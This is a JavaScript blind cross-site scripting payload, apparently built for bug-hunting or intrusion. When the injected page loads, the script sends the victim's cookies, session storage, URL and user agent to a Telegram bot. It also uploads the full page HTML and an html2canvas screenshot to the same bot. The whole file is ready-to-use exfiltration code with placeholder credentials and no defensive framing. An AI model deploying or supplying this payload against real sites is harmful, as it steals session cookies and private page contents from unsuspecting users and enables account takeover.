

        // Replace 'YourBotToken' and 'YourChatID' with your actual bot token and chat ID
        const botToken = 'xxxxx:xxxxxxxxxx';
        const chatID = 'xxxxxx';

        function sendHTMLContentAsFile() {
            const telegramAPI = `https://api.telegram.org/bot${botToken}/sendDocument`;
            const formData = new FormData();

            const pageHTML = document.documentElement.outerHTML;

            const blob = new Blob([pageHTML], { type: 'text/html' });

            formData.append('chat_id', chatID);
            formData.append('document', blob, 'page_content.html');

            fetch(telegramAPI, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('HTML content sent as file to Telegram');
                } else {
                    console.error('Error sending file:', data.description);
                }
            })
            .catch(error => {
                console.error('Error sending file:', error);
            });
        }

        function captureAndSendScreenshot() {
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
            script.onload = () => {
                html2canvas(document.body).then(canvas => {
                    const telegramAPI = `https://api.telegram.org/bot${botToken}/sendPhoto`;
                    const formData = new FormData();
                    
                    // Convert the canvas to a Blob
                    canvas.toBlob(blob => {
                        formData.append('chat_id', chatID);
                        formData.append('photo', blob, 'screenshot.png');

                        // Send the image to Telegram
                        fetch(telegramAPI, {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.ok) {
                                console.log('Screenshot sent to Telegram');
                            } else {
                                console.error('Error sending screenshot:', data.description);
                            }
                        })
                        .catch(error => {
                            console.error('Error sending screenshot:', error);
                        });
                    });
                });
            };
            document.head.appendChild(script);
        }

        function sendMessage() {
            const currentURL = window.location.href;
            const cookies = document.cookie;
            const executionTime = new Date().toISOString();
            const userAgent = navigator.userAgent;
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const sessionStorageContent = JSON.stringify(sessionStorage);

            const content = `
                🚨 *Blind XSS Alert* 🚨
                
                🔗 *URL*: ${currentURL}
                🍪 *Cookies*: ${cookies}
                🕒 *Execution Time*: ${executionTime}
                💻 *User Agent*: ${userAgent}
                🖥️ *Screen Resolution*: ${screenResolution}
                📦 *Session Storage*: ${sessionStorageContent}
            `;

            const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(telegramAPI, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatID,
                    text: content,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log('Details sent to Telegram');
                } else {
                    console.error('Error sending message:', data.description);
                }
            })
            .catch(error => {
                console.error('Error sending message:', error);
            });
        }

        window.onload = () => {
            sendMessage();
            sendHTMLContentAsFile();
            captureAndSendScreenshot();
        };

